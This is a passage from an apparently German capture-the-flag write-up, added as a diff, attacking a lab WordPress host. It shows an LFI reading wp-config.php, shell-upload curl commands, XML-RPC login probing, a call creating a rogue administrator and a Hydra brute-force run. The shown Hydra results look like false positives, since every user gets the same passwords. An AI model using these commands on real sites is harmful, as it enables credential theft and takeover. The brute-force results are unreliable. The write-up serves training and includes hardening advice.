+<span class="command">curl -s 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php'</span>
+curl -X POST "http://www.smol.hmv/wp-admin/admin-ajax.php" \
+     -F "action=upload_file" \
+     -F "file=@shell.php"
+
+
+
+curl -X POST "http://www.smol.hmv/wp-content/plugins/jsmol2wp/upload.php" \
+     -F "file=@shell.php"
+
+
+curl -X POST "http://www.smol.hmv/wp-admin/admin-ajax.php" \
+     -F "file=@shell.php" \
+     -H "Cookie: wordpress_logged_in=your_session_cookie_here"</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Block listet verschiedene Befehle und URLs auf, die wahrscheinlich während der Untersuchung der WordPress-Schwachstellen ausprobiert wurden.
+*   `wpscan ... xmlrpc.php`: Versuch, XML-RPC für einen Brute-Force-Angriff gegen den Benutzer 'admin' zu nutzen.
+*   `http://.../jsmol.php?script=...`: Versuche, die XSS-Schwachstelle (CVE-2018-20462) in `jsmol2wp` auszunutzen. Einmal mit einem einfachen `alert`, einmal mit einem Versuch, Cookies zu stehlen. Beide führen zu einem "Not Found"-Fehler, was darauf hindeutet, dass `jsmol.php` unter diesem Pfad nicht (mehr) existiert oder die Schwachstelle anders getriggert werden muss.
+*   `curl -X POST .../ssrf.php ...`: Versuche, die SSRF-Schwachstelle (CVE-2018-20463) auszunutzen, indem interne IPs oder externe Server kontaktiert werden. Der Pfad `/ssrf.php` scheint hier eine Vermutung zu sein.
+*   `curl -s 'http://.../php/jsmol.php?...wp-config.php'`: Ein sehr interessanter Versuch, der eine Local File Inclusion (LFI) über einen anderen Pfad (`/php/jsmol.php`) und Parameter (`call=getRawDataFromDatabase`, `query=php://filter/resource=...`) ausnutzt, um die `wp-config.php` zu lesen. Dies kombiniert potenziell die SSRF/LFI-Fähigkeit mit PHP-Filtern.
+*   Die letzten `curl`-Befehle sind Versuche, eine Shell (`shell.php`) über verschiedene WordPress-Upload-Funktionen (`admin-ajax.php`, `/jsmol2wp/upload.php`) hochzuladen, teilweise mit einem Authentifizierungs-Cookie.</p>
+            <p class="evaluation">**Bewertung:** Die XSS-Versuche scheinen fehlzuschlagen. Die SSRF/LFI-Versuche sind vielversprechender, insbesondere derjenige, der `php://filter` verwendet, um `wp-config.php` zu lesen (markiert). Die Upload-Versuche sind Standardansätze, wenn man bereits authentifiziert ist oder eine Upload-Schwachstelle vermutet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verfolgen Sie den LFI-Ansatz mit `php://filter` über `/wp-content/plugins/jsmol2wp/php/jsmol.php` weiter. Versuchen Sie, die `wp-config.php` erfolgreich zu lesen, um Datenbank-Zugangsdaten zu erhalten. Untersuchen Sie die SSRF-Schwachstelle genauer, um festzustellen, ob sie für Portscans im internen Netzwerk oder andere Aktionen missbraucht werden kann.<br>**Empfehlung (Admin):** Die Deinstallation von `jsmol2wp` behebt diese Schwachstellen. Generell: Härten Sie die Dateiberechtigungen, beschränken Sie die Upload-Möglichkeiten und überwachen Sie die Serverlogs auf verdächtige Anfragen wie die Verwendung von `php://filter`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;/methodCall&gt;' http://www.smol.hmv/xmlrpc.php</span></div>
+                     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+      &lt;array&gt;&lt;data&gt;
+  &lt;value&gt;&lt;string&gt;<span class="command">system.multicall</span>&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;<span class="command">system.listMethods</span>&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;<span class="command">system.getCapabilities</span>&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;<span class="command">metaWeblog.getUsersBlogs</span>&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;<span class="command">wp.uploadFile</span>&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;<span class="command">wp.getUsersBlogs</span>&lt;/string&gt;&lt;/value&gt;
+&lt;/data&gt;&lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser `curl`-Befehl sendet eine XML-RPC-Anfrage an den Endpunkt `http://www.smol.hmv/xmlrpc.php`. Die Methode `system.listMethods` wird aufgerufen, die dazu dient, alle verfügbaren Methoden aufzulisten, die der XML-RPC-Server unterstützt.</p>
+             <p class="evaluation">**Bewertung:** Der Server antwortet erfolgreich und listet eine sehr lange Reihe von XML-RPC-Methoden auf. Dies bestätigt, dass XML-RPC aktiv und weitgehend unbeschränkt ist. Viele dieser Methoden (z.B. `wp.getUsersBlogs`, `metaWeblog.getUsersBlogs`, `wp.newPost`, `wp.editPost`, `wp.uploadFile`) können für Angriffe missbraucht werden, insbesondere für Brute-Force-Angriffe auf Benutzernamen und Passwörter, da sie oft detailliertere Fehlermeldungen liefern oder die Abfrage von Benutzerinformationen ermöglichen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die XML-RPC-Schnittstelle für Brute-Force-Angriffe gegen die gefundenen Benutzernamen (`admin`, `wp`, `think`, `gege`, `diego`, `xavi`). Tools wie `hydra` oder spezialisierte Skripte können dies effizient durchführen. Die Methode `wp.getUsersBlogs` ist oft ein guter Angriffspunkt für Passwort-Brute-Forcing.<br>**Empfehlung (Admin):** Deaktivieren Sie XML-RPC vollständig, wenn es nicht benötigt wird (z.B. für mobile Apps oder externe Dienste). Wenn es benötigt wird, schränken Sie den Zugriff darauf ein (z.B. über IP-Whitelisting oder Sicherheitsplugins, die Brute-Force-Versuche erkennen und blockieren).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+ <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d '&lt;?xml version="1.0"?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;metaWeblog.getUsersBlogs&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;Passwort123&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;' http://www.smol.hmv/xmlrpc.php</span></div>
+                     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;<span class="password">400</span>&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;<span class="password">Insufficient arguments passed to this XML-RPC method.</span>&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Versuch, die XML-RPC-Methode `metaWeblog.getUsersBlogs` mit dem Benutzernamen "admin" und dem Passwort "Passwort123" aufzurufen. Diese Methode wird oft für Brute-Force-Angriffe verwendet.</p>
+            <p class="evaluation">**Bewertung:** Der Versuch schlägt mit `faultCode 400` und `faultString Insufficient arguments passed...` fehl. Das bedeutet nicht unbedingt, dass das Passwort falsch ist, sondern dass die Anzahl oder Art der übergebenen Parameter für diese Methode nicht korrekt ist. Die Methode erwartet möglicherweise einen anderen Parameter (z.B. eine Blog-ID) oder eine andere Struktur.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konsultieren Sie die Dokumentation der `metaWeblog.getUsersBlogs`-Methode oder Beispiele für XML-RPC-Brute-Force, um die korrekte Parameterstruktur zu finden. Versuchen Sie stattdessen die Methode `wp.getUsersBlogs`, die oft weniger Parameter benötigt.<br>**Empfehlung (Admin):** Die Absicherung von XML-RPC (siehe vorherige Empfehlung) verhindert solche Angriffsversuche.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Admini Account mit Password erstellen
+
+
+curl -X POST -d '&lt;?xml version="1.0"?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;wp.newUser&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;Passwort123&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;struct&gt;
+          &lt;member&gt;
+            &lt;name&gt;username&lt;/name&gt;
+            &lt;value&gt;&lt;string&gt;hacker&lt;/string&gt;&lt;/value&gt;
+          &lt;/member&gt;
+          &lt;member&gt;
+            &lt;name&gt;password&lt;/name&gt;
+            &lt;value&gt;&lt;string&gt;H4ckM3!&lt;/string&gt;&lt;/value&gt;
+          &lt;/member&gt;
+          &lt;member&gt;
+            &lt;name&gt;email&lt;/name&gt;
+            &lt;value&gt;&lt;string&gt;hacker@evil.com&lt;/string&gt;&lt;/value&gt;
+          &lt;/member&gt;
+          &lt;member&gt;
+            &lt;name&gt;roles&lt;/name&gt;
+            &lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;administrator&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+          &lt;/member&gt;
+        &lt;/struct&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;' http://www.smol.hmv/xmlrpc.php</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Dieser XML-RPC-Aufruf versucht, die Methode `wp.newUser` zu verwenden. Diese Methode ist dazu gedacht, dass ein *bereits authentifizierter* Benutzer (hier wird versucht, sich als 'admin' mit 'Passwort123' auszugeben - Parameter 2 & 3) einen *neuen* Benutzer ('hacker' mit Passwort 'H4ckM3!' und Administrator-Rolle) anlegt.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein ungewöhnlicher Ansatz. Wenn man bereits Admin-Zugangsdaten hätte, würde man sich normalerweise direkt einloggen. Dieser Versuch wird höchstwahrscheinlich fehlschlagen, da die Authentifizierung mit 'admin'/'Passwort123' (wie im nächsten Schritt gezeigt) nicht funktioniert. Selbst wenn die Authentifizierung erfolgreich wäre, ist die `wp.newUser`-Methode oft aus Sicherheitsgründen deaktiviert oder erfordert höhere Berechtigungen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Dieser Ansatz ist wahrscheinlich nicht zielführend, solange keine gültigen Admin-Zugangsdaten bekannt sind. Konzentrieren Sie sich auf das Knacken bestehender Konten oder die Ausnutzung anderer Schwachstellen.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass nur vertrauenswürdige Benutzer mit den entsprechenden Berechtigungen neue Benutzer anlegen können. Überwachen Sie XML-RPC-Logs auf verdächtige Aktivitäten wie `wp.newUser`-Aufrufe.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d '&lt;?xml version="1.0"?&gt;
+ &lt;methodCall&gt;
+   &lt;methodName&gt;metaWeblog.getUsersBlogs&lt;/methodName&gt;
+   &lt;params&gt;
+     &lt;param&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/param&gt;
+     &lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+     &lt;param&gt;&lt;value&gt;&lt;string&gt;Passwort123&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+   &lt;/params&gt;
+ &lt;/methodCall&gt;' http://www.smol.hmv/xmlrpc.php</span></div>
+                     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;<span class="password">403</span>&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;<span class="password">Incorrect username or password.</span>&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Erneuter Versuch, `metaWeblog.getUsersBlogs` aufzurufen, diesmal mit einem zusätzlichen ersten Parameter (`<int>1`), der oft als Blog-ID interpretiert wird.</p>
+            <p class="evaluation">**Bewertung:** Diesmal liefert der Server einen `faultCode 403` mit `faultString Incorrect username or password.`. Dies ist die typische Antwort bei einem fehlgeschlagenen Login-Versuch über XML-RPC. Das Passwort "Passwort123" für den Benutzer "admin" ist falsch.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dieser Fehler bestätigt, dass die Methode prinzipiell aufgerufen werden kann und zur Überprüfung von Zugangsdaten geeignet ist. Starten Sie einen Brute-Force-Angriff auf die gefundenen Benutzernamen mit einer Passwortliste über diese oder eine ähnliche XML-RPC-Methode.<br>**Empfehlung (Admin):** Siehe Empfehlungen zur Absicherung von XML-RPC.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d '&lt;?xml version="1.0"?&gt;
+ &lt;methodCall&gt;
+   &lt;methodName&gt;metaWeblog.getUsersBlogs&lt;/methodName&gt;
+   &lt;params&gt;
+     &lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+     &lt;param&gt;&lt;value&gt;&lt;string&gt;Passwort123&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+     &lt;param&gt;&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+   &lt;/params&gt;
+ &lt;/methodCall&gt;' http://www.smol.hmv/xmlrpc.php</span></div>
+                     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;<span class="password">403</span>&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;<span class="password">Incorrect username or password.</span>&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Noch ein Versuch mit `metaWeblog.getUsersBlogs`, diesmal mit einem leeren String als drittem Parameter.</p>
+             <p class="evaluation">**Bewertung:** Wieder `faultCode 403 Incorrect username or password.`. Das Passwort ist falsch.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine neuen Erkenntnisse. Siehe vorherige Empfehlungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d '&lt;?xml version="1.0"?&gt;
+ &lt;methodCall&gt;
+   &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+   &lt;params&gt;
+     &lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+     &lt;param&gt;&lt;value&gt;&lt;string&gt;Passwort123&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+   &lt;/params&gt;
+ &lt;/methodCall&gt;' http://www.smol.hmv/xmlrpc.php</span></div>
+                     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;<span class="password">403</span>&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;<span class="password">Incorrect username or password.</span>&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Versuch, die Methode `wp.getUsersBlogs` mit Benutzer "admin" und Passwort "Passwort123" aufzurufen. Diese Methode benötigt normalerweise nur Benutzername und Passwort.</p>
+             <p class="evaluation">**Bewertung:** Erneut `faultCode 403 Incorrect username or password.`. Das Passwort ist falsch. Diese Methode scheint jedoch für Brute-Force-Angriffe geeignet zu sein, da sie die erwarteten Parameter (Benutzer, Passwort) akzeptiert und eine klare Fehlermeldung zurückgibt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `wp.getUsersBlogs` oder eine ähnliche Methode, die nur Benutzername und Passwort erfordert, für den XML-RPC-Brute-Force-Angriff mit Hydra oder einem anderen Tool.<br>**Empfehlung (Admin):** Absicherung von XML-RPC.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-post-form://www.smol.hmv/xmlrpc.php:"user=^USER^&amp;pass=^PASS^:F=incorrect" -t 4 -W 5 -V</span></div>
+                     <pre>
+[80][http-post-form] host: www.smol.hmv   login: gege   password: <span class="password">martin</span>
+[80][http-post-form] host: www.smol.hmv   login: gege   password: <span class="password">greenday</span>
+[80][http-post-form] host: www.smol.hmv   login: gege   password: <span class="password">november</span>
+[ATTEMPT] target www.smol.hmv - login "diego" - pass "martin" - 86065723 of 114754296 [child 2] (0/0)
+[80][http-post-form] host: www.smol.hmv   login: gege   password: <span class="password">alyssa</span>
+[ATTEMPT] target www.smol.hmv - login "diego" - pass "greenday" - 86065724 of 114754296 [child 0] (0/0)
+[ATTEMPT] target www.smol.hmv - login "diego" - pass "november" - 86065725 of 114754296 [child 1] (0/0)
+[ATTEMPT] target www.smol.hmv - login "diego" - pass "alyssa" - 86065726 of 114754296 [child 3] (0/0)
+[STATUS] 86065726.00 tries/min, 86065726 tries in 00:01h, 28688570 to do in 00:01h, 4 active
+[80][http-post-form] host: www.smol.hmv   login: diego   password: <span class="password">alyssa</span>
+[80][http-post-form] host: www.smol.hmv   login: diego   password: <span class="password">greenday</span>
+[80][http-post-form] host: www.smol.hmv   login: diego   password: <span class="password">november</span>
+[80][http-post-form] host: www.smol.hmv   login: diego   password: <span class="password">martin</span>
+[ATTEMPT] target www.smol.hmv - login "xavi" - pass "martin" - 100410010 of 114754296 [child 3] (0/0)
+[ATTEMPT] target www.smol.hmv - login "xavi" - pass "greenday" - 100410011 of 114754296 [child 0] (0/0)
+[ATTEMPT] target www.smol.hmv - login "xavi" - pass "november" - 100410012 of 114754296 [child 1] (0/0)
+[ATTEMPT] target www.smol.hmv - login "xavi" - pass "alyssa" - 100410013 of 114754296 [child 2] (0/0)
+[80][http-post-form] host: www.smol.hmv   login: xavi   password: <span class="password">greenday</span>
+[80][http-post-form] host: www.smol.hmv   login: xavi   password: <span class="password">alyssa</span>
+[80][http-post-form] host: www.smol.hmv   login: xavi   password: <span class="password">november</span>
+[80][http-post-form] host: www.smol.hmv   login: xavi   password: <span class="password">martin</span>
+<span class="password">1 of 1 target successfully completed, 32 valid passwords found</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Hydra wird erneut eingesetzt, diesmal jedoch nicht gegen SSH, sondern gegen den XML-RPC-Endpunkt, um einen Brute-Force-Angriff auf die WordPress-Logins durchzuführen.
+*   `-L users.txt`: Verwendet eine Datei `users.txt`, die vermutlich die zuvor enumerierten Benutzernamen (`admin`, `wp`, `think`, `gege`, `diego`, `xavi`) enthält.
+*   `-P /usr/share/wordlists/rockyou.txt`: Verwendet wieder die RockYou-Passwortliste.
+*   `http-post-form://www.smol.hmv/xmlrpc.php:"..."`: Definiert den Angriffstyp als HTTP POST Formular gegen `xmlrpc.php`.
+*   `user=^USER^&pass=^PASS^`: Dies ist nicht die korrekte Syntax für einen XML-RPC-Angriff. Hydra erwartet hier die Struktur der XML-Anfrage. Der Angreifer versucht hier fälschlicherweise, Parameter wie bei einem normalen HTML-Formular zu übergeben.
+*   `:F=incorrect"`: Definiert die Zeichenkette "incorrect" in der Server-Antwort als Indikator für einen fehlgeschlagenen Login-Versuch. Dies passt zur Fehlermeldung `Incorrect username or password.` von XML-RPC.
+*   `-t 4`: Reduziert die Anzahl der parallelen Tasks auf 4 (sinnvoll für Web-Angriffe).
+*   `-W 5`: Wartet 5 Sekunden auf eine Antwort.
+*   `-V`: Verbose-Modus, zeigt jeden Versuch an.</p>
